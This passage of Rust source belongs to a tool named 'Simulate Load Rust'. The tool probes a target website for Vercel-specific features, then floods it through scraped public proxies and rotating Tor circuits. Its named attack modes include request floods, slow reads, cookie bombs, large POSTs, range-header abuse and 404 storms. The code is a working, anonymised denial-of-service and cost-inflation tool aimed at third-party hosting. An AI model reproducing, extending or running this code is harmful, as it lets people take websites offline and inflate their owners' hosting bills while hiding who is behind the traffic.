    if !apis.is_empty() { status.push_str(&format!("{} APIs ✅ ", apis.len())); }
    if middleware { status.push_str("MW ✅ "); }
    if isr { status.push_str("ISR ✅ "); }
    if cache_bypass { status.push_str("CacheBypass ✅ "); }
    if edge_config { status.push_str("EdgeCfg ✅ "); }
    if vercel { status.push_str("LogDrain 🔸 "); }
    if verified_statics.is_empty() && !imgopt && apis.is_empty() && !middleware { status.push_str("Empty/unreachable"); }

    let mut st = state.lock().await;
    st.probe_status = status; st.is_vercel = vercel; st.vercel_plan = plan; st.has_image_opt = imgopt; st.has_api = !apis.is_empty(); st.has_middleware = middleware;
    st.has_isr = isr; st.has_cache_bypass = cache_bypass; st.has_edge_config = edge_config; st.has_log_drains = vercel; st.has_storage = false;
    st.imgs = imgs; st.apis = apis; st.statics = verified_statics;
}

async fn filter_alive_proxies(proxies: &[String], state: &Arc<Mutex<AppState>>) -> Vec<String> {
    let to = 1u64;
    let tc = 1000usize;
    let total = proxies.len();
    state.lock().await.tcp_total = total as u32;
    state.lock().await.status_msg = format!("TCP check {}...", total);
    let sem = Arc::new(Semaphore::new(tc));
    let a = Arc::new(Mutex::new(Vec::new()));
    let d = Arc::new(AtomicUsize::new(0));
    let s2 = Arc::clone(state);
    let mut h = Vec::with_capacity(total);
    for p in proxies.to_owned() {
        let permit = Arc::clone(&sem).acquire_owned().await.unwrap();
        let aa = Arc::clone(&a);
        let dd = Arc::clone(&d);
        let ss = Arc::clone(&s2);
        h.push(tokio::spawn(async move {
            if tcp_check(&p, to).await {
                aa.lock().await.push(p);
            }
            let n = dd.fetch_add(1, Ordering::Relaxed) + 1;
            if n % 500 == 0 || n == total {
                ss.lock().await.tcp_checked = n as u32;
                ss.lock().await.status_msg = format!("TCP: {}/{}", n, total);
            }
            drop(permit);
        }));
    }
    for x in h {
        let _ = x.await;
    }
    let alive_result = a.lock().await.clone();
    alive_result
}

async fn get_proxies(mode: ProxyMode, state: &Arc<Mutex<AppState>>) -> Option<Vec<String>> {
    match mode {
        ProxyMode::Tor => {
            state.lock().await.status_msg = "Checking Tor...".to_string();
            let ok = tokio::time::timeout(Duration::from_secs(3), tokio::net::TcpStream::connect("127.0.0.1:9050")).await.ok().and_then(|r| r.ok()).is_some();
            if ok {
                let n = state.lock().await.load_concurrency.min(20);
                let mut p = Vec::with_capacity(n);
                for i in 0..n { p.push(format!("socks5://tor{}:isolate@127.0.0.1:9050", i)); }
                state.lock().await.status_msg = format!("Tor ready, {} circuits", n);
                Some(p)
            } else if let Ok(custom) = std::env::var("TOR_PROXY") {
                let base = custom.trim_end_matches('?').trim_end_matches('/');
                let base = if let Some(pos) = base.find('@') { &base[pos+1..] } else { base };
                let n = state.lock().await.load_concurrency.min(20);
                let mut p = Vec::with_capacity(n);
                for i in 0..n { p.push(format!("socks5://tor{}:isolate@{}", i, base)); }
                state.lock().await.status_msg = format!("Using TOR_PROXY: {} ({} circuits)", base, n);
                Some(p)
            } else {
                state.lock().await.status_msg = "Tor unavailable".to_string();
                None
            }
        }
        ProxyMode::Scrape | ProxyMode::ScrapeTorFallback => {
            state.lock().await.status_msg = "Scraping proxies...".to_string();
            let c = browser_client_builder().timeout(Duration::from_secs(15)).build().unwrap();
            let scraped = match tokio::time::timeout(Duration::from_secs(30), scrape_all(&c, state)).await {
                Ok(res) => res,
                Err(_) => {
                    let mut st = state.lock().await;
                    st.status_msg = "Proxy scraping timed out".to_string();
                    vec![]
                }
            };
            if scraped.is_empty() {
                if mode == ProxyMode::ScrapeTorFallback { /* fall through to Tor */ }
                else { state.lock().await.status_msg = "No proxies scraped".to_string(); return None; }
            }
            state.lock().await.status_msg = format!("{} proxies scraped", scraped.len());
            state.lock().await.total_scraped = scraped.len();
            let sample: Vec<String> = scraped.into_iter().take(2000).collect();
            let alive = filter_alive_proxies(&sample, state).await;
            state.lock().await.total_alive = alive.len(); state.lock().await.status_msg = format!("TCP alive: {}", alive.len());
            let mut result = alive;
            result.sort(); result.dedup();
            if result.is_empty() && mode == ProxyMode::ScrapeTorFallback {
                state.lock().await.status_msg = "Scrape failed, Tor fallback...".to_string();
                if tokio::time::timeout(Duration::from_secs(3), tokio::net::TcpStream::connect("127.0.0.1:9050")).await.ok().and_then(|r| r.ok()).is_some() {
                    let n = state.lock().await.load_concurrency.min(20);
                    let mut p = Vec::with_capacity(n);
                    for i in 0..n { p.push(format!("socks5://tor{}:isolate@127.0.0.1:9050", i)); }
                    return Some(p);
                } else { state.lock().await.status_msg = "Tor fallback unavailable".to_string(); return None; }
            }
            if result.is_empty() { None } else { result.sort(); result.dedup(); Some(result) }
        }
    }
}

async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<std::sync::Mutex<ProxyPool>>, stats: Stats, delay_ms: u64, max_errors: Option<u64>) {
    let (conc, interval, attack, sessions) = {
        let st = state.lock().await;
        (st.load_concurrency, st.interval_ms, st.attack_mode, st.sessions.clone())
    };
    let delay = if delay_ms > 0 { delay_ms } else { interval };
    let semaphore = Arc::new(Semaphore::new(conc));

    loop {
        if max_errors.is_some() && stats.errors.load(Ordering::Relaxed) >= max_errors.unwrap() {
            println!("  Max errors ({}) reached, stopping.", max_errors.unwrap());
            break;
        }
        if !stats.running.load(Ordering::Relaxed) { tokio::time::sleep(Duration::from_millis(100)).await; continue; }
        let target_url = state.lock().await.target_url.clone();
        if target_url.is_empty() { tokio::time::sleep(Duration::from_millis(100)).await; continue; }
        let _ = Url::parse(&target_url).ok();

        let (imgs, apis, statics, _has_isr, _has_cache_bypass, _has_log_drains, _has_storage) = {
            let st = state.lock().await; (st.imgs.clone(), st.apis.clone(), st.statics.clone(), st.has_isr, st.has_cache_bypass, st.has_log_drains, st.has_storage)
        };
        let assets: Vec<String> = match attack {
            AttackMode::Normal => { if statics.is_empty() { vec!["/".into()] } else { statics.clone() } },
            AttackMode::ImageOpt => { if imgs.is_empty() { vec!["/".into()] } else { imgs.clone() } },
            AttackMode::SSR => { if apis.is_empty() { vec!["/".into()] } else { apis.clone() } },
            AttackMode::Middleware => { if statics.is_empty() { vec!["/".into()] } else { statics.clone() } },
            _ => vec!["/".into()]
        };

        loop {
            if !stats.running.load(Ordering::Relaxed) { break; }
            let _permit = semaphore.clone().acquire_owned().await.unwrap();
            let next_client = {
                let mut p_lock = pool.lock().unwrap();
                p_lock.next()
            };
            if let Some((idx, client)) = next_client {
                let stats_clone = stats.clone();
                let proxy_id = format!("p{}", idx);
                let assets = assets.clone();
                let attack = attack;
                let target = target_url.clone();
                let sessions_clone = sessions.clone();
                let idx1 = rand::rng().random_range(0..assets.len());
                let pool_clone = pool.clone();
                let _ = tokio::spawn(async move {
                    let result = match attack {
                        AttackMode::Bandwidth | AttackMode::Normal => {
                            if assets.is_empty() { fetch_page(client, target.clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
                            else { fetch_page(client, assets[idx1].clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
                        }
                        AttackMode::SlowRead => {
                            fetch_slow(client, target.clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await
                        }
                        AttackMode::ImageOpt => {
                            if assets.is_empty() { fetch_page(client, target.clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
                            else { fetch_range(client, assets[idx1].clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
                        }
                        AttackMode::LargePost => {
                            fetch_post(client, target.clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await
                        }
                        AttackMode::AssetSpray => {
                            if assets.is_empty() { fetch_page(client, target.clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
                            else { fetch_page(client, assets[idx1].clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
                        }
                        AttackMode::RangeReq => {
                            if assets.is_empty() { fetch_range(client, target.clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
                            else { fetch_range(client, assets[idx1].clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
                        }
                        AttackMode::CookieBomb => {
                            fetch_cookie(client, target.clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await
                        }
                        AttackMode::SSR => {
                            if assets.is_empty() { fetch_page(client, target.clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
                            else { fetch_page(client, assets[idx1].clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
                        }
                        AttackMode::Middleware => {
                            if assets.is_empty() { fetch_page(client, target.clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
                            else { fetch_page(client, assets[idx1].clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
                        }
                        AttackMode::RequestFlood => {
                            fetch_page(client, target.clone(), 0, 0, proxy_id.clone(), sessions_clone.clone()).await
                        }
                        AttackMode::NotFound => {
                            let path = format!("/nonexistent-{:08x}", rand::random::<u32>());
                            fetch_page(client, format!("{}{}", target.trim_end_matches('/'), path), delay, 0, proxy_id.clone(), sessions_clone.clone()).await
                        }
                    };
                    match result {
                        Ok(bytes) => {
                            stats_clone.total_requests.fetch_add(1, Ordering::Relaxed);
                            stats_clone.total_bytes.fetch_add(bytes as u64, Ordering::Relaxed);
                            pool_clone.lock().unwrap().report_success(idx);
                        }
                        Err(_) => {
                            stats_clone.errors.fetch_add(1, Ordering::Relaxed);
                            pool_clone.lock().unwrap().report_failure(idx);
                        }
                    }
                });
                break;
            } else {
                tokio::time::sleep(Duration::from_millis(100)).await;
            }
        }
        
        tokio::time::sleep(Duration::from_millis(interval)).await;
    }
}

fn write_probe_csv(path: &str, target: &str, status: &str, proxies: &[String], concurrency: usize, attack: &str) {
    let status_escaped = status.replace(',', ";");
    let content = format!("target,status,proxy_count,concurrency,attack_mode\n{},{},{},{},{}\n", target, status_escaped, proxies.len(), concurrency, attack);
    std::fs::write(path, content).unwrap();
    println!("  CSV written to {}", path);
}

fn write_results_csv(path: &str, target: &str, status: &str, proxies: &[String], concurrency: usize, attack: &str, total_reqs: u64, total_bytes: u64, duration: u64) {
    let status_escaped = status.replace(',', ";");
    let content = format!("target,status,proxy_count,concurrency,attack_mode,total_requests,total_bytes,duration_sec,kb_per_sec\n{},{},{},{},{},{},{},{}{:.2}\n",
        target, status_escaped, proxies.len(), concurrency, attack,
        total_reqs, total_bytes, duration, total_bytes as f64 / duration as f64 / 1024.0);
    std::fs::write(path, content).unwrap();
    println!("  CSV written to {}", path);
}

#[tokio::main]
async fn main() {
    let args: Vec<String> = std::env::args().collect();
    // Parse flags
    let mut tor_only = false;
    let mut dry_run = false;
    let mut verify = false;
    let mut version = false;
    let mut list_modes = false;
    let mut save_proxies: Option<String> = None;
    let mut output_csv: Option<String> = None;
    let mut proxy_file: Option<String> = None;
    let mut tor_proxy: Option<String> = None;
    let mut delay_ms: u64 = 0;
    let mut max_errors: Option<u64> = None;
    let mut positional: Vec<String> = Vec::new();

    let mut args_iter = args.into_iter().skip(1);
    while let Some(arg) = args_iter.next() {
        match arg.as_str() {
            "-h" | "--help" => {
                print_help();
                return;
            }
            "-v" | "--version" => version = true,
            "--list-modes" => list_modes = true,
            "--tor-only" => tor_only = true,
            "--verify" => verify = true,
            "--dry-run" => dry_run = true,
            "--output" => {
                if let Some(val) = args_iter.next() {
                    output_csv = Some(val);
                }
            }
            "--proxy-file" => {
                if let Some(val) = args_iter.next() {
                    proxy_file = Some(val);
                }
            }
            "--tor-proxy" => {
                if let Some(val) = args_iter.next() {
                    tor_proxy = Some(val);
                }
            }
            "--delay" => {
                if let Some(val) = args_iter.next() {
                    delay_ms = val.parse().unwrap_or(0);
                }
            }
            "--max-errors" => {
                if let Some(val) = args_iter.next() {
                    max_errors = val.parse().ok();
                }
            }
            "--save-proxies" => {
                if let Some(val) = args_iter.next() {
                    save_proxies = Some(val);
                }
            }
            other => {
                if other.starts_with("--output=") {
                    output_csv = Some(other.strip_prefix("--output=").unwrap().to_string());
                } else if other.starts_with("--proxy-file=") {
                    proxy_file = Some(other.strip_prefix("--proxy-file=").unwrap().to_string());
                } else if other.starts_with("--tor-proxy=") {
                    tor_proxy = Some(other.strip_prefix("--tor-proxy=").unwrap().to_string());
                } else if other.starts_with("--delay=") {
                    delay_ms = other.strip_prefix("--delay=").unwrap().parse().unwrap_or(0);
                } else if other.starts_with("--max-errors=") {
                    max_errors = other.strip_prefix("--max-errors=").unwrap().parse().ok();
                } else if other.starts_with("--save-proxies=") {
                    save_proxies = Some(other.strip_prefix("--save-proxies=").unwrap().to_string());
                } else if other.starts_with('-') {
                    eprintln!("Unknown option: {}", other);
                    std::process::exit(1);
                } else {
                    positional.push(other.to_string());
                }
            }
        }
    }

    let target_url = positional.get(0).cloned().unwrap_or_else(|| DEFAULT_TARGET_URL.to_string());
    let mode_str = positional.get(1).map(|s| s.as_str()).unwrap_or("scrape");
    let attack_str = positional.get(2).map(|s| s.as_str()).unwrap_or("normal");
    let concurrency: usize = positional.get(3).and_then(|s| s.parse().ok()).unwrap_or(20);
    let duration_secs: u64 = positional.get(4).and_then(|s| s.parse().ok()).unwrap_or(30);

    if tor_only {
        let state = Arc::new(Mutex::new(AppState::new()));
        state.lock().await.target_url = target_url.to_string();
        state.lock().await.mode = ProxyMode::Tor;
        println!("[tor-only] Checking Tor...");
        let ok = tokio::time::timeout(Duration::from_secs(3), tokio::net::TcpStream::connect("127.0.0.1:9050")).await.ok().and_then(|r| r.ok()).is_some();
        if !ok && tor_proxy.is_none() {
            eprintln!("  [tor-only] Tor not available. Install Tor or use --tor-proxy.");
            std::process::exit(1);
        }
        if ok {
            println!("  Tor OK (local relay)");
        } else {
            println!("  Using custom Tor proxy");
        }
        println!("  [TOR-ONLY] Configuration verified. Ready for Tor-based load testing.");
        return;
    }

    if verify {
        println!("=== Simulate Load Rust ===");
        println!("Target: {}", target_url);
        println!("Mode: {} (proxy: {})", attack_str, mode_str);
        println!("Concurrency: {}  Duration: {}s", concurrency, duration_secs);
        println!("");

        // Probe domain
        let state = Arc::new(Mutex::new(AppState::new()));
        state.lock().await.target_url = target_url.to_string();
        state.lock().await.load_concurrency = concurrency;
        state.lock().await.attack_mode = match attack_str {
            "bandwidth" => AttackMode::Bandwidth,
            "slowread" => AttackMode::SlowRead,
            "imageopt" => AttackMode::ImageOpt,
            "largepost" => AttackMode::LargePost,
            "assetspray" => AttackMode::AssetSpray,
            "rangereq" => AttackMode::RangeReq,
            "cookiebomb" => AttackMode::CookieBomb,
            "ssr" => AttackMode::SSR,
            "middleware" => AttackMode::Middleware,
            "requestflood" => AttackMode::RequestFlood,
            "notfound" => AttackMode::NotFound,
            _ => AttackMode::Normal,
        };
        match mode_str {
            "tor" => state.lock().await.mode = ProxyMode::Tor,
            "scrape-tor" => state.lock().await.mode = ProxyMode::ScrapeTorFallback,
            _ => state.lock().await.mode = ProxyMode::Scrape,
        }

        println!("[1/2] Probing domain...");
        probe_domain(&target_url, &state).await;
        let status = {
            let st = state.lock().await;
            st.probe_status.clone()
        };
        println!("  {}", status);
        println!("");

        println!("[2/2] Verifying proxies...");
        let proxies = if let Some(path) = &proxy_file {
            let content = std::fs::read_to_string(path).unwrap_or_default();
            let list: Vec<String> = content
                .split(|c: char| c.is_whitespace() || c == ',')
                .filter_map(|s| { let s = s.trim(); if !s.is_empty() { Some(s.to_string()) } else { None }})
                .collect();
            if list.is_empty() {
                None
            } else {
                println!("  Verifying {} proxies from file...", list.len());
                let verified = filter_alive_proxies(&list, &state).await;
                Some(verified)
            }
        } else if let Some(url) = &tor_proxy {
            let n = concurrency.min(20);
            let mut p = Vec::with_capacity(n);
            for i in 0..n { p.push(format!("socks5://tor{}:isolate@{}", i, url.trim_start_matches("socks5://").trim_start_matches("http://"))); }
            Some(p)
        } else {
            let mode = { state.lock().await.mode };
            get_proxies(mode, &state).await
        };
        match proxies {
            Some(prox_list) => {
                println!("  Acquired {} proxies", prox_list.len());
                if let Some(path) = &save_proxies {
                    let content = prox_list.join("\n");
                    std::fs::write(path, content).unwrap();
                    println!("  Saved {} proxies to {}", prox_list.len(), path);
                }
                println!("  [VERIFIED] Proxy health check complete.");
            }
            None => {
                eprintln!("  Failed to get proxies.");
                std::process::exit(1);
            }
        }
        return;
    }

    if version {
        println!("{} v{}", env!("CARGO_PKG_NAME"), env!("CARGO_PKG_VERSION"));
        return;
    }
    if list_modes {
        println!("Attack modes:");
        println!("  normal        Standard HTTP GET requests");
        println!("  bandwidth     Heavy bandwidth consumption");
        println!("  slowread      Slow read (deliberate slow download)");
        println!("  imageopt      Image optimization endpoints");
        println!("  largepost     Large POST requests");
        println!("  assetspray    Spray all static assets");
        println!("  rangereq      Range header requests");
        println!("  cookiebomb    Cookie bomb (many cookies)");
        println!("  ssr           Server-side rendering endpoints");
        println!("  middleware    Middleware/edge endpoint stress");
        println!("  requestflood  No-delay request flood");
        println!("  notfound      404 storm (nonexistent paths)");
        return;
    }

    println!("=== Simulate Load Rust ===");
    println!("Target: {}", target_url);
    println!("Mode: {} (proxy: {})", attack_str, mode_str);
    println!("Concurrency: {}  Duration: {}s", concurrency, duration_secs);
    println!("");

    // Probe domain
    let state = Arc::new(Mutex::new(AppState::new()));
    state.lock().await.target_url = target_url.to_string();
    state.lock().await.load_concurrency = concurrency;
    state.lock().await.attack_mode = match attack_str {
        "bandwidth" => AttackMode::Bandwidth,
        "slowread" => AttackMode::SlowRead,
        "imageopt" => AttackMode::ImageOpt,
        "largepost" => AttackMode::LargePost,
        "assetspray" => AttackMode::AssetSpray,
        "rangereq" => AttackMode::RangeReq,
        "cookiebomb" => AttackMode::CookieBomb,
        "ssr" => AttackMode::SSR,
        "middleware" => AttackMode::Middleware,
        "requestflood" => AttackMode::RequestFlood,
        "notfound" => AttackMode::NotFound,
        _ => AttackMode::Normal,
    };

    match mode_str {
        "tor" => state.lock().await.mode = ProxyMode::Tor,
        "scrape-tor" => state.lock().await.mode = ProxyMode::ScrapeTorFallback,
        _ => state.lock().await.mode = ProxyMode::Scrape,
    }

    println!("[1/3] Probing domain...");
    probe_domain(&target_url, &state).await;
    let status = {
        let st = state.lock().await;
        st.probe_status.clone()
    };
    println!("  {}", status);
    println!("");
    println!("[2/3] Acquiring proxies...");
    // Handle --proxy-file and --tor-proxy first (bypass scraping)
    let proxies = if let Some(path) = &proxy_file {
        let content = std::fs::read_to_string(path).unwrap_or_default();
        let list: Vec<String> = content
            .split(|c: char| c.is_whitespace() || c == ',')
            .filter_map(|s| { let s = s.trim(); if !s.is_empty() { Some(s.to_string()) } else { None }})
            .collect();
        if list.is_empty() {
            eprintln!("  No proxies found in file {}", path);
            None
        } else {
            println!("  Verifying {} proxies from file...", list.len());
            let verified = filter_alive_proxies(&list, &state).await;
            if verified.is_empty() {
                eprintln!("  No alive proxies found in file {}", path);
                None
            } else {
                Some(verified)
            }
        }
    } else if let Some(url) = &tor_proxy {
        let n = concurrency.min(20);
        let mut p = Vec::with_capacity(n);
        for i in 0..n { p.push(format!("socks5://tor{}:isolate@{}", i, url.trim_start_matches("socks5://").trim_start_matches("http://"))); }
        println!("  Using TOR_PROXY: {} ({} circuits)", url, n);
        Some(p)
    } else {
        let mode = { state.lock().await.mode };
        get_proxies(mode, &state).await
    };
    match proxies {
        None => {
            eprintln!("  Failed to get proxies. Exiting.");
            std::process::exit(1);
        }
        Some(prox_list) => {
            println!("  Got {} proxies", prox_list.len());
            if dry_run {
                println!("  [DRY RUN] Skipping load test. Use without --dry-run to execute.");
                // Write CSV output if requested
                if let Some(path) = &output_csv {
                    write_probe_csv(path, &target_url, &status, &prox_list, concurrency, attack_str);
                }
                return;
            }
            let pool = Arc::new(std::sync::Mutex::new(ProxyPool::new(&prox_list)));
            println!("[3/3] Running load for {}s...", duration_secs);
            let stats = {
                let st = state.lock().await;
                st.stats.clone()
            };
            stats.running.store(true, Ordering::Relaxed);
            let state_clone = state.clone();
            let pool_clone = pool.clone();
            let stats_clone = stats.clone();
            let start = Instant::now();
            let mut elapsed_secs = duration_secs;
            tokio::spawn(run_load(state_clone, pool_clone, stats_clone, delay_ms, max_errors));

            let mut last_requests = 0u64;
            let mut last_bytes = 0u64;
            let mut last_time = start;

            while start.elapsed().as_secs() < duration_secs {
                tokio::time::sleep(Duration::from_millis(1000)).await;
                let cur_reqs = stats.total_requests.load(Ordering::Relaxed);
                let cur_bytes = stats.total_bytes.load(Ordering::Relaxed);
                let cur_errors = stats.errors.load(Ordering::Relaxed);

                let now = Instant::now();
                let delta_t = now.duration_since(last_time).as_secs_f64();
                if delta_t > 0.0 {
                    let req_rate = (cur_reqs - last_requests) as f64 / delta_t;
                    let byte_rate = (cur_bytes - last_bytes) as f64 / delta_t / 1024.0;
                    println!(
                        "  [Elapsed: {}s] {:.1} req/s | {:.2} KB/s | Errors: {}",
                        start.elapsed().as_secs(),
                        req_rate,
                        byte_rate,
                        cur_errors
                    );
                }
                last_requests = cur_reqs;
                last_bytes = cur_bytes;
                last_time = now;

                if max_errors.is_some() && cur_errors >= max_errors.unwrap() {
                    elapsed_secs = start.elapsed().as_secs().max(1);
                    break;
                }
            }
            stats.running.store(false, Ordering::Relaxed);

            let final_reqs = stats.total_requests.load(Ordering::Relaxed);
            let final_bytes = stats.total_bytes.load(Ordering::Relaxed);
            let final_stats = format!(
                "Completed: {} req, {} bytes ({:.2} KB/s)",
                final_reqs,
                final_bytes,
                final_bytes as f64 / elapsed_secs as f64 / 1024.0,
            );
            println!("  {}", final_stats);
            if let Some(ref path) = output_csv {
                write_results_csv(path, &target_url, &status, &prox_list, concurrency, attack_str,
                    final_reqs, final_bytes, elapsed_secs);
            }
        }
    }
}
